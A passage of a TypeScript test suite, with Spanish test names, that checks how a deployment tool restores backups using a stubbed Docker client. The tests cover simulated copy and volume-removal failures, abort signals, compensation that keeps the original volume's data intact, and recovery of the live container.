      (call, state) => {
        if (call[0] !== 'cp' || !call[1].startsWith('appforge-tmp-verify-')) return false;
        const cname = call[1].split(':/data/')[0]!;
        return state.containerVolumes.get(cname) === liveVolume;
      },
      'fail',
      'simulated verify failure after partial restore',
    );
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RESTORE_FAILED_COMPENSATED/);
    expect(stub.volumes.has(liveVolume)).toBe(true);
    expect(stub.volumeFiles.get(liveVolume)?.has('app.db') ?? false).toBe(false);
  });

  test('señal original abortada durante restore → compensación usa presupuesto independiente', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    makeValidBackup(dataDir);
    const liveVolume = projectLiveVolumeName(PID);
    const originalBytes = seedLiveVolumeWithData(stub);
    seedLiveContainer(stub);
    const controller = new AbortController();
    stub.failWhen(
      (call, state) => {
        if (call[0] !== 'cp' || !call[1].startsWith('appforge-tmp-verify-')) return false;
        const cname = call[1].split(':/data/')[0]!;
        if (state.containerVolumes.get(cname) !== liveVolume) return false;
        controller.abort();
        return true;
      },
      'aborted',
    );
    const r = await d.restoreBackup({
      projectId: PID,
      deploymentId: DID,
      candidateId: `cand-${DID.slice(0, 8)}`,
      backupId: BACKUP_ID,
      signal: controller.signal,
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RESTORE_FAILED_COMPENSATED/);
    expect(controller.signal.aborted).toBe(true);
    const after = stub.volumeFiles.get(liveVolume)?.get('app.db');
    expect(after).toBeDefined();
    expect(Buffer.compare(after!, originalBytes)).toBe(0);
    const compensationCreate = stub.calls
      .map((call, index) => ({ call, index }))
      .filter(({ call }) => call[0] === 'volume' && call[1] === 'create' && call[call.length - 1] === liveVolume)
      .at(-1)?.index ?? -1;
    expect(compensationCreate).toBeGreaterThanOrEqual(0);
    expect(stub.callSignals[compensationCreate]).not.toBe(controller.signal);
    expect(stub.callSignals[compensationCreate]?.aborted).toBe(false);
  });

  test('fallo en volume rm del live → el volumen original sobrevive intacto', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    makeValidBackup(dataDir);
    const liveVolume = projectLiveVolumeName(PID);
    const originalBytes = seedLiveVolumeWithData(stub);
    seedLiveContainer(stub);
    stub.failWhen(
      (c) => c[0] === 'volume' && c[1] === 'rm' && c[2] === liveVolume,
      'fail',
      'simulated volume rm failure',
    );
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/RESTORE_FAILED_COMPENSATED/);
    // El volumen nunca se eliminó: datos originales intactos.
    expect(stub.volumes.has(liveVolume)).toBe(true);
    const after = stub.volumeFiles.get(liveVolume)?.get('app.db');
    expect(after).toBeDefined();
    expect(Buffer.compare(after!, originalBytes)).toBe(0);
  });

  test('recoverCurrentLiveBackup restaura físicamente y arranca la misma imagen live sana', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    const { bytes: backupBytes } = makeValidBackup(dataDir);
    seedLiveVolumeWithData(stub);
    const manifest = JSON.parse(
      fs.readFileSync(path.join(dataDir, 'deploy-snapshots', DID, '.appforge-manifest.json'), 'utf8'),
    ) as { fingerprint: string };
    const names = resourceNames(PID, DID, manifest.fingerprint);
    const labels = {
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.deployment-id': DID,
      'com.appforge.role': 'live',
      'com.appforge.source-fingerprint': manifest.fingerprint,
    };
    stub.containers.set(LIVE, {
      Config: { Labels: labels, User: '1001', Image: names.image },
      State: { Running: false },
    });
    stub.containerTemplate = goodLiveInspect(labels, names.liveVolume, names.image);
    (d as unknown as { runHealthCheck: (a: never) => Promise<unknown> }).runHealthCheck = async () => ({ ok: true });
    const operationId = '99999999-8888-4777-8666-555555555555';

    const recovered = await d.recoverCurrentLiveBackup({
      projectId: PID,
      deploymentId: operationId,
      candidateId: `cand-${operationId.slice(0, 8)}`,
      backupId: BACKUP_ID,
    });

    expect(recovered.ok).toBe(true);
    expect(recovered.data?.liveImage).toBe(names.image);
    const restored = stub.volumeFiles.get(names.liveVolume)?.get('app.db');
    expect(restored).toBeDefined();
    expect(Buffer.compare(restored!, backupBytes)).toBe(0);
    const live = stub.containers.get(LIVE) as { State?: { Running?: boolean } };
    expect(live.State?.Running).toBe(true);
  });
});
